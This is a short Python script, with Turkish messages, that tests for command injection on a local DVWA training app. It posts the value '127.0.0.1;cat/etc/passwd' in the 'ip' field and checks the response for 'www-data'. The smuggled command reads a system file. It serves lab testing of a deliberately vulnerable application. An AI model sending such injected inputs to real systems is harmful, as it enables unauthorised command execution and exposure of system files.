import requests
import json

url="http://127.0.0.1/DVWA-master/vulnerabilities/exec/"
header={"Cookie":"security=impossible; PHPSESSID=jjbk76nopcvi02drleg9hghpi6"}
data={"ip":"127.0.0.1;cat/etc/passwd","submit":"submit"}

sonuc=requests.post(url=url,data=data,headers=header)

if "www-data" in str(sonuc.content):
    print("command injection vardır")
else:
    print("command injection yoktur")